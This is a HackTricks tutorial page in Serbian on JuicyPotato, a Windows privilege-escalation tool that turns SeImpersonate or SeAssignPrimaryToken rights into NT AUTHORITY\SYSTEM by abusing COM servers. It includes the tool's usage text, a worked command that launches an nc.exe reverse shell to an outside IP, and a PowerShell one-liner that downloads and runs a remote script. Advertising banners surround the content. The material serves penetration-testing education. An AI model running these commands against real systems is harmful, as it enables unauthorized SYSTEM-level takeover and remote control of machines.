# Sočna krompira

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) **Discord grupi** ili **telegram grupi** ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova** na [**hacktricks repozitorijum**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repozitorijum**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) je pretraživač na **dark vebu** koji nudi **besplatne** funkcionalnosti za proveru da li je kompanija ili njeni korisnici **kompromitovani** od strane **malvera za krađu podataka**.

Primarni cilj WhiteIntela je borba protiv preuzimanja naloga i napada ransomvera koji proizilaze iz malvera za krađu informacija.

Možete posetiti njihovu veb lokaciju i isprobati njihovu mašinu za **besplatno** na:

{% embed url="https://whiteintel.io" %}

---

{% hint style="warning" %}
**JuicyPotato ne radi** na Windows Serveru 2019 i Windows 10 verziji 1809 i novijim. Međutim, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) mogu se koristiti za **iskorišćavanje istih privilegija i dobijanje pristupa na nivou `NT AUTHORITY\SYSTEM`**. _**Proverite:**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Sočni krompir (zloupotreba zlatnih privilegija) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Šećerom prekrivena verzija_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, sa malo soka, tj. **još jedan alat za lokalno eskaliranje privilegija, od Windows servisnih naloga do NT AUTHORITY\SYSTEM**_

#### Možete preuzeti sočni krompir sa [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Rezime <a href="#summary" id="summary"></a>

[**Iz sočnog krompira Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) i njegovi [varijanti](https://github.com/decoder-it/lonelypotato) iskorišćavaju lanac eskalacije privilegija zasnovan na [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [servisu](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) koji ima MiTM slušaoca na `127.0.0.1:6666` i kada imate privilegije `SeImpersonate` ili `SeAssignPrimaryToken`. Tokom pregleda Windows izgradnje otkrili smo postavku gde je `BITS` namerno onemogućen i port `6666` je zauzet.

Odlučili smo da oružamo [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Pozdravite Sočni Krompir**.

> Za teoriju, pogledajte [Rotten Krompir - Eskalacija privilegija od servisnih naloga do SISTEMA](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) i pratite lanac veza i referenci.

Otkrili smo da, osim `BITS`-a, postoji nekoliko COM servera koje možemo zloupotrebiti. Samo treba da:

1. budu instancirani od strane trenutnog korisnika, obično "servisnog korisnika" koji ima privilegije impersonacije
2. implementiraju `IMarshal` interfejs
3. pokreću se kao privilegovan korisnik (SISTEM, Administrator, …)

Nakon nekih testiranja dobili smo i testirali obimnu listu [interesantnih CLSID-ova](http://ohpe.it/juicy-potato/CLSID/) na nekoliko verzija Windowsa.

### Sočni detalji <a href="#juicy-details" id="juicy-details"></a>

Sočni krompir vam omogućava da:

* **Ciljajte CLSID** _izaberite bilo koji CLSID koji želite._ [_Ovde_](http://ohpe.it/juicy-potato/CLSID/) _možete pronaći listu organizovanu po OS-u._
* **COM slušajući port** _definišite COM slušajući port koji preferirate (umesto marshalled hardkodiranog 6666)_
* **COM slušajuća IP adresa** _vezujte server na bilo koju IP adresu_
* **Režim kreiranja procesa** _u zavisnosti od privilegija impersoniranog korisnika možete birati između:_
* `CreateProcessWithToken` (potrebno je `SeImpersonate`)
* `CreateProcessAsUser` (potrebno je `SeAssignPrimaryToken`)
* `oba`
* **Proces za pokretanje** _pokrenite izvršnu datoteku ili skriptu ako iskorišćavanje uspe_
* **Argument procesa** _prilagodite argumente pokrenutog procesa_
* **RPC Server adresa** _za prikriveni pristup možete se autentifikovati na spoljni RPC server_
* **RPC Server port** _korisno ako želite da se autentifikujete na spoljni server a firewall blokira port `135`…_
* **TEST režim** _pretežno za testiranje, tj. testiranje CLSID-ova. Kreira DCOM i ispisuje korisnika tokena. Pogledajte_ [_ovde za testiranje_](http://ohpe.it/juicy-potato/Test/)
### Upotreba <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Završne misli <a href="#final-thoughts" id="final-thoughts"></a>

[**Iz juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Ako korisnik ima privilegije `SeImpersonate` ili `SeAssignPrimaryToken`, tada ste **SYSTEM**.

Gotovo je nemoguće sprečiti zloupotrebu svih ovih COM servera. Možete razmisliti o izmeni dozvola ovih objekata putem `DCOMCNFG`, ali srećno, ovo će biti izazovno.

Stvarno rešenje je zaštita osetljivih naloga i aplikacija koje se izvršavaju pod nalozima `* SERVICE`. Zaustavljanje `DCOM` bi svakako sprečilo ovu eksploataciju, ali bi moglo imati ozbiljan uticaj na osnovni OS.

Od: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Primeri

Napomena: Posetite [ovu stranicu](https://ohpe.it/juicy-potato/CLSID/) za listu CLSID-ova koje možete isprobati.

### Dobijanje nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev

### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Pokrenite novi CMD (ako imate RDP pristup)

![](<../../.gitbook/assets/image (297).png>)

## Problemi sa CLSID-om

Često se podrazumevani CLSID koji JuicyPotato koristi **ne radi** i eksploatacija ne uspeva. Obično je potrebno više pokušaja da pronađete **radni CLSID**. Da biste dobili listu CLSID-ova koje treba isprobati za određeni operativni sistem, posetite ovu stranicu:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **Provera CLSID-ova**

Prvo, trebaće vam neki izvršni fajlovi osim juicypotato.exe.

Preuzmite [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) i učitajte ga u svoju PS sesiju, zatim preuzmite i izvršite [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Taj skript će kreirati listu mogućih CLSID-ova za testiranje.

Zatim preuzmite [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(promenite putanju do liste CLSID-ova i do izvršnog fajla juicypotato) i izvršite ga. Počeće da isprobava svaki CLSID, i **kada se broj porta promeni, to znači da je CLSID uspeo**.

**Proverite** radne CLSID-ove **koristeći parametar -c**

## Reference

* [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) je pretraživač pokretan **dark-webom** koji nudi **besplatne** funkcionalnosti za proveru da li je kompanija ili njeni korisnici **kompromitovani** od strane **malvera za krađu podataka**.

Njihov primarni cilj WhiteIntela je borba protiv preuzimanja naloga i napada ransomware-a koji proizilaze iz malvera za krađu informacija.

Možete posetiti njihovu veb lokaciju i isprobati njihov pretraživač **besplatno** na:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite pristup **najnovijoj verziji PEASS-a ili preuzimanje HackTricks-a u PDF-u**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) **Discord grupi**](https://discord.gg/hRep4RUj7f) ili **telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikova slanjem PR-ova u** [**repozitorijum hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozitorijum hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
